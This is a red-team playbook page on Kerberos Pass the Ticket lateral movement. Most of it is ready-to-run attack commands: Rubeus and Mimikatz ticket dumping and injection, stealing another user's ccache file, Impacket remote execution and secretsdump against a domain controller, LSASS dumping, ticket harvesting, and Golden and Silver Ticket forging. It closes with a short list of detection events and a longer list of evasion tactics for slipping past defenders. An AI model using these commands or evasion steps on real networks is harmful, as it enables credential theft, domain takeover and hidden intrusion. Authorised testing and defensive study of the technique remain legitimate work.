# Pass the Ticket (PtT)

> **MITRE ATT&CK**: Lateral Movement > T1550.003 - Use Alternate Authentication Material: Pass the Ticket
> **Platforms**: Windows, Linux (with Kerberos)
> **Required Privileges**: User-level (with a stolen ticket)
> **OPSEC Risk**: Medium

## Strategic Overview

Pass the Ticket is a Kerberos-based lateral movement technique where a stolen Ticket Granting Ticket (TGT) or Ticket Granting Service (TGS) ticket is injected into the current session to authenticate as another user. Unlike Pass the Hash, PtT uses Kerberos authentication, which is the default and expected authentication protocol in Active Directory environments. This makes PtT inherently stealthier from an NTLM-monitoring perspective. The choice between injecting a TGT versus a TGS matters: a TGT grants broad access to request service tickets for any service the user can access, while a TGS limits access to a single specific service. Red team leads must understand ticket lifetimes, renewal windows, and the implications of clock skew when executing PtT across hosts.

### TGT vs TGS Injection Considerations

| Aspect             | TGT Injection                        | TGS Injection                        |
|--------------------|--------------------------------------|--------------------------------------|
| Scope of access    | Any service the user can reach       | Single service on a single host      |
| Ticket source      | LSASS, KRBTGT hash (Golden Ticket)   | LSASS, service hash (Silver Ticket)  |
| Requires DC access | Yes (to request new TGS tickets)     | No (ticket is self-contained)        |
| Lifetime           | Default 10 hours, renewable 7 days   | Varies by service, often shorter     |
| Detection surface  | TGS requests visible in DC logs      | No DC interaction for Silver Tickets |

## Technical Deep-Dive

### 1. Ticket Extraction

```powershell
# Rubeus -- dump all tickets from current logon session (base64)
Rubeus.exe dump /nowrap

# Rubeus -- dump tickets for a specific LUID
Rubeus.exe dump /luid:0x3e7 /nowrap

# Mimikatz -- export all tickets to .kirbi files
mimikatz# sekurlsa::tickets /export

# Mimikatz -- list tickets in memory
mimikatz# kerberos::list

# From Linux -- extract from ccache files
ls /tmp/krb5cc_*
cp /tmp/krb5cc_1000 /tmp/stolen_ticket.ccache
```

### 2. Ticket Injection with Rubeus

```powershell
# Inject a base64-encoded ticket into the current session
Rubeus.exe ptt /ticket:doIFmjCCBZag...base64_ticket_data...

# Inject from a .kirbi file
Rubeus.exe ptt /ticket:C:\temp\admin_tgt.kirbi

# Create a new logon session and inject (avoids overwriting current tickets)
Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:corp.local /username:administrator /password:Fake /ticket:base64_data /show

# Verify injection
klist
dir \\DC01\C$
```

### 3. Ticket Injection with Mimikatz

```
# Inject a .kirbi ticket file
mimikatz# kerberos::ptt C:\temp\administrator@krbtgt-CORP.LOCAL.kirbi

# Purge existing tickets first to avoid conflicts
mimikatz# kerberos::purge
mimikatz# kerberos::ptt ticket.kirbi
```

### 4. Ticket Use on Linux with Impacket

```bash
# Set the Kerberos credential cache environment variable
export KRB5CCNAME=/tmp/administrator.ccache

# Use with any Impacket tool -- the -k flag forces Kerberos, -no-pass skips password prompt
psexec.py corp.local/administrator@dc01.corp.local -k -no-pass
wmiexec.py corp.local/administrator@dc01.corp.local -k -no-pass
smbexec.py corp.local/administrator@dc01.corp.local -k -no-pass
secretsdump.py corp.local/administrator@dc01.corp.local -k -no-pass

# Note: hostname must match the SPN in the ticket -- use FQDN, not IP
```

### 5. Ticket Format Conversion

```bash
# Convert .kirbi (Windows/Mimikatz) to .ccache (Linux/Impacket)
ticketConverter.py administrator.kirbi administrator.ccache

# Convert .ccache back to .kirbi
ticketConverter.py administrator.ccache administrator.kirbi

# Rubeus can also output in ccache-compatible base64
# Decode base64 to .kirbi: echo "base64data" | base64 -d > ticket.kirbi
```

### 6. Harvesting Tickets at Scale

```powershell
# Rubeus -- monitor for new TGTs (useful on busy servers)
Rubeus.exe monitor /interval:30 /nowrap

# Rubeus -- harvest and auto-renew TGTs
Rubeus.exe harvest /interval:30

# Target specific high-value users
Rubeus.exe dump /user:domain_admin /nowrap

# Remote ticket extraction via LSASS dump
# 1. Dump LSASS on target (procdump, comsvcs.dll, etc.)
# 2. Parse offline: mimikatz# sekurlsa::minidump lsass.dmp → sekurlsa::tickets /export
```

### 7. Golden and Silver Ticket Injection

```powershell
# Golden Ticket (forged TGT -- requires KRBTGT hash)
mimikatz# kerberos::golden /user:administrator /domain:corp.local /sid:S-1-5-21-... /krbtgt:HASH /ptt

# Silver Ticket (forged TGS -- requires service account hash)
mimikatz# kerberos::golden /user:administrator /domain:corp.local /sid:S-1-5-21-... /target:sql01.corp.local /service:MSSQLSvc /rc4:HASH /ptt

# These are technically ticket forging, but the injection mechanism is identical to PtT
```

## Detection & Evasion

### Detection Indicators

- **Event ID 4768** (TGT Request) -- absence of this event when a TGT appears in a session suggests injection
- **Event ID 4769** (TGS Request) -- service ticket requests from unexpected source hosts
- **Event ID 4624** (Logon Type 3) with Kerberos authentication from hosts where the user never logged in
- TGT lifetimes or encryption types inconsistent with domain policy (Golden Ticket indicator)
- Anomalous Kerberos traffic patterns: tickets appearing on hosts without prior interactive logon

### Evasion Techniques

- Use `createnetonly` in Rubeus to inject into a sacrificial process rather than the current session
- Match ticket encryption type to domain defaults (AES256 preferred over RC4)
- Inject tickets during normal business hours when the target user would be active
- Prefer TGTs from recently authenticated users (ticket age appears normal)
- Renew stolen tickets at natural intervals rather than using maximum lifetime
- Use Kerberos authentication exclusively to avoid NTLM-based detections
- Ensure time synchronization with the domain controller (clock skew > 5 min causes failures)

### Common Pitfalls

- Using IP addresses instead of hostnames with Kerberos (SPNs use hostnames)
- Clock skew between attacker machine and domain controller
- Injecting expired tickets without checking lifetime
- Overwriting your own tickets and losing access to your current session

## Cross-References

- [[pass-the-hash]] - When you have NTLM hashes instead of tickets
- [[overpass-the-hash]] - Convert NTLM hash to Kerberos ticket
- Section 06: Credential Access - Ticket extraction from LSASS
- Section 10: Domain Escalation - Golden/Silver Ticket forging
- Section 05: Kerberoasting and AS-REP Roasting for service ticket abuse

## References

- https://attack.mitre.org/techniques/T1550/003/
- https://www.thehacker.recipes/ad/movement/kerberos/ptt
- https://github.com/GhostPack/Rubeus
- https://adsecurity.org/?p=1667
- https://blog.gentilkiwi.com/securite/mimikatz/pass-the-ticket-kerberos
